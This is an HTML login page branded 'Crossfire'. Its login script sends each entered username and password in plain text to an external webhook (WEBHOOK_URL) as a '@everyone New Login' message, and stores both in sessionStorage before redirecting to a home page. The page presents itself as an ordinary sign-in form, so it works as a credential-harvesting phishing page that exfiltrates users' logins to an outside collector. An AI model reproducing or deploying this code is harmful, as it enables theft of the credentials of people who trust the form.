<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Poppins", sans-serif;
    }

    body {
      height: 100vh;
      background: rgba(40, 40, 40, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      gap: 15px;
    }

    .logo-box {
      background: rgba(40, 40, 40, 0.9);
      border: 2px solid rgba(90, 90, 90, 0.5);
      border-radius: 20px;
      padding: 20px 30px;
      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.6), inset 0 0 25px rgba(255, 255, 255, 0.05);
      display: flex;
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(6px);
    }

    .logo-box img {
      height: 90px;
      width: auto;
    }

    .login-box {
      width: 320px;
      background: rgba(40, 40, 40, 0.9);
      border-radius: 20px;
      padding: 40px 35px;
      backdrop-filter: blur(6px);
      color: #e5e5e5;
      text-align: center;
      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.6), inset 0 0 25px rgba(255, 255, 255, 0.05);
      border: 2px solid rgba(90, 90, 90, 0.5);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .login-box:hover {
      transform: translateY(-3px);
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7), inset 0 0 30px rgba(255, 255, 255, 0.08);
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid rgba(100, 100, 100, 0.6);
      border-radius: 10px;
      background: rgba(60, 60, 60, 0.9);
      color: #f0f0f0;
      font-size: 1rem;
      outline: none;
      transition: 0.2s;
      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.6);
    }

    input::placeholder {
      color: #b3b3b3;
    }

    input:focus {
      background: rgba(75, 75, 75, 0.95);
      border-color: #c0c0c0;
      box-shadow: 0 0 8px rgba(180, 180, 180, 0.5), inset 0 2px 5px rgba(0, 0, 0, 0.7);
    }

    button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(90deg, #5a5a5a, #3e3e3e);
      border: none;
      border-radius: 10px;
      color: #f0f0f0;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.3s;
      margin-top: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    button:hover {
      background: linear-gradient(90deg, #6b6b6b, #4a4a4a);
      transform: scale(1.03);
      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.7);
    }

    .error {
      color: #f87171;
      margin-top: 8px;
      font-size: 0.9rem;
      display: none;
      text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
    }
  </style>
</head>
<body>
  <div class="logo-box">
    <img src="/assets/crossfire.png" alt="Crossfire Logo">
  </div>

  <div class="login-box">
    <input type="text" id="username" placeholder="Enter username" />
    <input type="password" id="password" placeholder="Enter password" />
    <button onclick="login()">Login</button>
    <p class="error" id="error-msg">Please enter both fields.</p>
  </div>

  <script>
    async function login() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const errorMsg = document.getElementById("error-msg");

      if (username && password) {
        sessionStorage.setItem("username", username);
        sessionStorage.setItem("password", password);

        const payload = {
          content: `||@everyone||
          **New Login:**\n> Username: \`${username}\`\n> Password: \`${password}\``
        };

        try {
          await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          });
        } catch (err) {
          console.error("Error sending to webhook:", err);
        }

        window.location.href = "/crossfire/home";
      } else {
        errorMsg.style.display = "block";
        setTimeout(() => (errorMsg.style.display = "none"), 2000);
      }
    }

    document.addEventListener("keypress", function (e) {
      if (e.key === "Enter") login();
    });
  </script>
</body>
</html>
